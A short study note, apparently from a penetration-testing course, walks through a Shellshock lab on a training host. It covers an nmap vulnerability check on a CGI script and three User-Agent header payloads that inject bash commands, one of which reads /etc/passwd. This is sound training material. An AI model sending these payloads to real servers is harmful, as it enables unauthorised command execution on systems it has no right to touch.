# Shellshock

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2802–2826. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Exploit the vulnerability and execute arbitrary commands on the target machine.

Tools: Nmap, Burpsuite

```bash
nmap -sV demo.ine.local
Browse: http://demo.ine.local
//got gettime.cgi
vuln check:
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
//The server is vulnerable to Shellshock attack.

**manually::**
http://demo.ine.local/gettime.cgi
//open burpsuite and send to repeater
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'

```
